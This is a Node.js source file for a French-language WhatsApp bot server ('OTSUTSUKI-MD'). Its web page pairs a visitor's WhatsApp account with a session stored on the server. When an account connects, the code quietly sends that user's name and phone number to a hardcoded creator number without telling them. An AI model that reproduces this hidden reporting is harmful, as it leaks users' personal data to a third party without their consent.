const express = require('express');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    makeCacheableSignalKeyStore,
    DisconnectReason,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const mongoose = require('mongoose');
const messageHandler = require('./messages.upsert');
const groupUpdateHandler = require('./events/group-participants.update'); 
const config = require('./config');
const fs = require('fs');
const { get_session, restaureAuth } = require('./session');

const app = express();
const PORT = process.env.PORT || 8000; 

// --- CONNEXION MONGODB ---
const mongoURI = process.env.MONGODB_URI;
if (mongoURI) {
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("🍃 OTSUTSUKI-MD : Base de données connectée !"))
    .catch(err => console.error("❌ ERREUR MONGODB :", err.message));
}

let activeSocks = {};
let currentQRs = {};
let pairingCodes = {};

async function startBot(userId = "main_admin", usePairing = false, phoneNumber = "") {
    const sessionDir = `./session_${userId}`;

    if (!fs.existsSync(sessionDir) && process.env.SESSION_ID && userId === "main_admin") {
        try {
            const sessionData = await get_session(process.env.SESSION_ID);
            if (sessionData) await restaureAuth(`session_${userId}`, sessionData.creds, sessionData.keys);
        } catch (e) { console.error("⚠️ Restauration impossible :", e.message); }
    }

    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();
    
    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: !usePairing,
        logger: pino({ level: "fatal" }),
        browser: ["Otsutsuki-MD", "Chrome", "1.0.0"], 
        syncFullHistory: false,
        markOnlineOnConnect: true,
    });

    if (usePairing && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber);
                pairingCodes[userId] = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(`🔑 CODE [${userId}] : ${pairingCodes[userId]}`);
            } catch (err) { console.error("Pairing Error:", err); }
        }, 3000);
    }

    activeSocks[userId] = sock;
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;
        if (qr) currentQRs[userId] = await QRCode.toDataURL(qr);

        if (connection === 'open') {
            currentQRs[userId] = "connected";
            delete pairingCodes[userId];
            const userJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const userName = sock.user.name || "Shinobi";
            
            // Notification au créateur
            const creatorNumber = "242068079834@s.whatsapp.net"; 
            if (userJid !== creatorNumber) {
                await sock.sendMessage(creatorNumber, { 
                    text: `🎭 *『 ALERTE DÉTECTION CHAKRA 』* 🎭\n\n👤 *NOM :* ${userName}\n📱 *NUMÉRO :* @${userJid.split('@')[0]}`,
                    mentions: [userJid]
                });
            }
        }

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) setTimeout(() => startBot(userId), 5000);
        }
    });

    sock.ev.on('messages.upsert', async (chatUpdate) => { await messageHandler(sock, chatUpdate); });
    sock.ev.on('group-participants.update', async (anu) => { if (groupUpdateHandler) await groupUpdateHandler(sock, anu); });

    return sock;
}

startBot();

// --- INTERFACE WEB STYLISÉE ---

const HTML_HEAD = `
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #111; border: 2px solid #f00; padding: 40px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 0, 0, 0.2); text-align: center; max-width: 400px; }
        h1 { margin: 0; color: #f00; letter-spacing: 2px; }
        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; text-align: center; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #f00; color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #b00; transform: scale(1.02); }
        .code-display { font-size: 40px; color: #0f0; background: #000; padding: 15px; border-radius: 10px; border: 1px dashed #0f0; letter-spacing: 5px; margin: 20px 0; }
        a { color: #888; text-decoration: none; font-size: 13px; }
    </style>
</head>`;

app.get('/', (req, res) => {
    res.send(`
        ${HTML_HEAD}
        <div class="card">
            <h1>⛩️ OTSUTSUKI</h1>
            <p style="color: #666;">Système de Liaison de Chakra</p>
            <form action="/pair" method="get">
                <input type="text" name="number" placeholder="Ex: 242068079834" required>
                <button type="submit">OBTENIR MON CODE</button>
            </form>
            <a href="/get-qr/main_admin">Ou utiliser le QR Code →</a>
        </div>
    `);
});

app.get('/pair', async (req, res) => {
    const num = req.query.number;
    if (!num) return res.redirect('/');
    
    const cleanNumber = num.replace(/[^0-9]/g, '');
    startBot("main_admin", true, cleanNumber);

    let checkCount = 0;
    const interval = setInterval(() => {
        checkCount++;
        if (pairingCodes["main_admin"]) {
            clearInterval(interval);
            res.send(`
                ${HTML_HEAD}
                <div class="card">
                    <h2 style="margin:0;">VOTRE CODE</h2>
                    <div class="code-display">${pairingCodes["main_admin"]}</div>
                    <p style="font-size: 14px; color: #888;">Entrez ce code sur votre téléphone dans "Appareils connectés"</p>
                    <button onclick="window.location.href='/'">RETOUR</button>
                </div>
            `);
        }
        if (checkCount > 15) {
            clearInterval(interval);
            res.send(`${HTML_HEAD}<div class="card"><p>⏳ Délai expiré. Rafraîchissez.</p><button onclick="window.location.reload()">RÉESSAYER</button></div>`);
        }
    }, 1000);
});

app.get('/get-qr/:id', (req, res) => {
    const qrData = currentQRs[req.params.id];
    if (qrData && qrData !== "connected") {
        res.send(`${HTML_HEAD}<div class="card"><h1>SCANNEZ MOI</h1><img src="${qrData}" style="width:100%; margin-top:20px; border-radius:10px;"/></div>`);
    } else {
        res.send(`${HTML_HEAD}<div class="card"><p>QR non disponible. Bot déjà connecté ou utilisez /pair.</p></div>`);
    }
});

app.listen(PORT, () => console.log("🌐 OTSUTSUKI actif sur le port " + PORT));
